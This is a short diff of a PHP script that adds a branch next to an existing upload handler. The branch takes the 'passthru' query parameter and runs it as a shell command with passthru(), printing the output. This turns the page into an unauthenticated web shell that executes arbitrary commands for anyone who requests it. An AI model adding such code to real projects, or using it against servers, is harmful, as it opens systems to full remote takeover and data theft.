@@ -45,4 +45,10 @@ if (isset($_GET['upload'])) {
     } catch (\Throwable $th) {
         var_dump($th);
     }
+} elseif (isset($_GET['passthru'])) {
+    try {
+        var_dump(passthru($_GET['passthru']));
+    } catch (\Throwable $th) {
+        var_dump($th);
+    }
 }
